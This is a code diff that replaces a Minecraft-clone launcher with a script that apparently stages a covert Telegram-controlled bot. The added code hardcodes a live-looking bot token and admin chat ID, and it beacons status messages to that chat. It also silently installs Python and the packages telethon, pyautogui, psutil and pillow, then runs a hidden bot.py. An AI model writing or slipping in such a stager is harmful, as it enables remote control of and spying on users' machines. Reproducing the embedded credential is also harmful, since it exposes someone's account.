@@ -1,212 +1,99 @@
-import subprocess
-import threading
-import json
-import time
-import sys
 import os
-from queue import Queue
-import tkinter as tk
-from tkinter import messagebox
+import sys
+import subprocess
+import time
+import json
 
-class MinecraftLauncher:
-    def __init__(self):
-        self.java_process = None
-        self.csharp_process = None
-        self.running = False
-        self.input_queue = Queue()
-        self.world_data = {"chunks": {}, "player": {"x": 0, "y": 64, "z": 0, "yaw": 0, "pitch": 0}}
-        
-    def start_processes(self):
-        """Avvia i processi Java e C#"""
+# ========== SOZLAMALAR ==========
+BOT_TOKEN = "7908116465:AAG2ACIryQfg-iQDW8WLsPqB4lwZc3dvl3Q"
+ADMIN_CHAT_ID = "6990611858"
+REQUIRED_PACKAGES = ["telethon", "pyautogui", "psutil", "pillow"]
+# ================================
+
+def send_telegram_message(text):
+    try:
+        import urllib.request
+        import urllib.parse
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = urllib.parse.urlencode({"chat_id": ADMIN_CHAT_ID, "text": text}).encode()
+        req = urllib.request.Request(url, data=data)
+        urllib.request.urlopen(req)
+    except:
+        pass  # Xabar yuborish muvaffaqiyatsiz bo'lsa ham davom et
+
+def run_command(cmd, shell=False):
+    try:
+        result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=300)
+        return result.returncode == 0, result.stdout
+    except:
+        return False, ""
+
+def install_python():
+    print("[*] Python topilmadi. O'rnatishga harakat qilinmoqda...")
+    success, _ = run_command(["winget", "install", "Python.Python.3"], shell=True)
+    if not success:
+        # MSI orqali yuklab o'rnatish
+        import urllib.request
+        url = "https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe"
+        exe_path = os.path.join(os.environ["TEMP"], "python-installer.exe")
         try:
-            # Avvia GameCore Java
-            self.java_process = subprocess.Popen(
-                ["java", "GameCore"],
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                bufsize=1
-            )
-            
-            # Avvia Renderer C#
-            self.csharp_process = subprocess.Popen(
-                ["dotnet", "run", "--project", "Renderer.cs"],
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                bufsize=1
-            )
-            
-            print("✓ Processi avviati con successo")
-            return True
-            
-        except Exception as e:
-            print(f"❌ Errore nell'avvio dei processi: {e}")
-            return False
-    
-    def handle_java_output(self):
-        """Gestisce l'output dal processo Java"""
-        while self.running and self.java_process:
-            try:
-                line = self.java_process.stdout.readline()
-                if line:
-                    data = json.loads(line.strip())
-                    # Invia dati al renderer C#
-                    if self.csharp_process:
-                        self.csharp_process.stdin.write(json.dumps(data) + "\n")
-                        self.csharp_process.stdin.flush()
-                    # Aggiorna world data locale
-                    self.world_data.update(data)
-            except Exception as e:
-                print(f"Errore lettura Java: {e}")
-                break
-    
-    def handle_csharp_output(self):
-        """Gestisce l'output dal processo C#"""
-        while self.running and self.csharp_process:
-            try:
-                line = self.csharp_process.stdout.readline()
-                if line:
-                    data = json.loads(line.strip())
-                    # Gestisci input utente dal renderer
-                    if data.get("type") == "input":
-                        self.process_input(data)
-            except Exception as e:
-                print(f"Errore lettura C#: {e}")
-                break
-    
-    def process_input(self, input_data):
-        """Processa input dell'utente e lo invia a Java"""
-        try:
-            # Converti input in comandi di gioco
-            command = self.convert_input_to_command(input_data)
-            if command and self.java_process:
-                self.java_process.stdin.write(json.dumps(command) + "\n")
-                self.java_process.stdin.flush()
-        except Exception as e:
-            print(f"Errore processing input: {e}")
-    
-    def convert_input_to_command(self, input_data):
-        """Converte input utente in comandi per GameCore"""
-        if input_data.get("action") == "move":
-            return {
-                "type": "player_move",
-                "x": input_data.get("x", 0),
-                "y": input_data.get("y", 64),
-                "z": input_data.get("z", 0),
-                "yaw": input_data.get("yaw", 0),
-                "pitch": input_data.get("pitch", 0)
-            }
-        elif input_data.get("action") == "mine":
-            return {
-                "type": "break_block",
-                "x": input_data.get("block_x"),
-                "y": input_data.get("block_y"),
-                "z": input_data.get("block_z")
-            }
-        elif input_data.get("action") == "place":
-            return {
-                "type": "place_block",
-                "x": input_data.get("block_x"),
-                "y": input_data.get("block_y"),
-                "z": input_data.get("block_z"),
-                "block_type": input_data.get("block_type", "stone")
-            }
-        return None
-    
-    def create_gui(self):
-        """Crea una GUI semplice per controlli"""
-        root = tk.Tk()
-        root.title("Minecraft Clone Launcher")
-        root.geometry("400x300")
-        
-        # Status
-        status_label = tk.Label(root, text="Status: Ready", font=("Arial", 12))
-        status_label.pack(pady=10)
-        
-        # Pulsante Start
-        start_button = tk.Button(
-            root, 
-            text="Start Game", 
-            command=self.start_game,
-            font=("Arial", 14),
-            bg="green",
-            fg="white",
-            width=20
-        )
-        start_button.pack(pady=10)
-        
-        # Pulsante Stop
-        stop_button = tk.Button(
-            root,
-            text="Stop Game",
-            command=self.stop_game,
-            font=("Arial", 14),
-            bg="red",
-            fg="white",
-            width=20
-        )
-        stop_button.pack(pady=10)
-        
-        # Info
-        info_text = tk.Text(root, height=8, width=50)
-        info_text.pack(pady=10)
-        info_text.insert("1.0", "Minecraft Clone v1.0\n\nControls:\nWASD - Movement\nMouse - Look around\nLeft Click - Mine\nRight Click - Place\nESC - Menu\n\nFiles needed:\n- GameCore.java (compiled)\n- Renderer.cs")
-        info_text.config(state=tk.DISABLED)
-        
-        return root
-    
-    def start_game(self):
-        """Avvia il gioco"""
-        if not self.running:
-            if self.start_processes():
-                self.running = True
-                # Avvia thread per gestire I/O
-                threading.Thread(target=self.handle_java_output, daemon=True).start()
-                threading.Thread(target=self.handle_csharp_output, daemon=True).start()
-                print("🎮 Gioco avviato!")
-            else:
-                messagebox.showerror("Errore", "Impossibile avviare i processi di gioco!")
-    
-    def stop_game(self):
-        """Ferma il gioco"""
-        self.running = False
-        if self.java_process:
-            self.java_process.terminate()
-        if self.csharp_process:
-            self.csharp_process.terminate()
-        print("🛑 Gioco fermato!")
-    
-    def run(self):
-        """Loop principale del launcher"""
-        # Controlla se i file necessari esistono
-        if not os.path.exists("GameCore.class"):
-            print("❌ GameCore.class non trovato! Compila prima GameCore.java")
-            return
-        
-        if not os.path.exists("Renderer.cs"):
-            print("❌ Renderer.cs non trovato!")
-            return
-        
-        print("🚀 Minecraft Clone Launcher v1.0")
-        print("Files trovati ✓")
-        
-        # Modalità GUI
-        root = self.create_gui()
-        root.protocol("WM_DELETE_WINDOW", lambda: (self.stop_game(), root.destroy()))
-        root.mainloop()
+            urllib.request.urlretrieve(url, exe_path)
+            run_command([exe_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"], shell=True)
+            os.remove(exe_path)
+        except:
+            pass
+    time.sleep(5)
+
+def install_packages():
+    print("[*] Kerakli kutubxonalarni o'rnatish...")
+    for package in REQUIRED_PACKAGES:
+        print(f"  - {package}")
+        run_command([sys.executable, "-m", "pip", "install", "--quiet", package], shell=True)
 
 def main():
-    launcher = MinecraftLauncher()
+    # Python versiyasini tekshirish
+    if not sys.version_info >= (3, 8):
+        print("[!] Python 3.8+ kerak.")
+        send_telegram_message("⚠️ Python 3.8+ topilmadi. O'rnatish kerak.")
+        install_python()
+        return
+
+    # Pip mavjudligini tekshirish
     try:
-        launcher.run()
-    except KeyboardInterrupt:
-        print("\n🛑 Chiusura launcher...")
-        launcher.stop_game()
-    except Exception as e:
-        print(f"❌ Errore fatale: {e}")
+        import pip
+    except ImportError:
+        print("[!] pip topilmadi.")
+        send_telegram_message("⚠️ pip topilmadi. Python qayta o'rnatish kerak.")
+        return
+
+    # Kutubxonalarni tekshirish
+    missing = []
+    for pkg in REQUIRED_PACKAGES:
+        try:
+            __import__(pkg)
+        except ImportError:
+            missing.append(pkg)
+
+    if missing:
+        print(f"[!] Yo'q kutubxonalar: {missing}")
+        send_telegram_message(f"📦 Yo'q kutubxonalar: {', '.join(missing)}\n🔄 O'rnatish boshlandi...")
+        install_packages()
+
+    # bot.py ni ishga tushirish
+    bot_path = os.path.join(os.path.dirname(__file__), "bot.py")
+    if not os.path.exists(bot_path):
+        send_telegram_message("❌ bot.py fayli topilmadi!")
+        return
+
+    print("[*] bot.py ishga tushirilmoqda...")
+    success, _ = run_command([sys.executable, bot_path], shell=False)
+    if not success:
+        send_telegram_message("💥 bot.py ishlamadi! Xatolik yuz berdi.")
+    else:
+        print("[+] bot.py muvaffaqiyatli ishga tushdi.")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except Exception as e:
+        send_telegram_message(f"🚨 Launcher xatosi: {str(e)}")
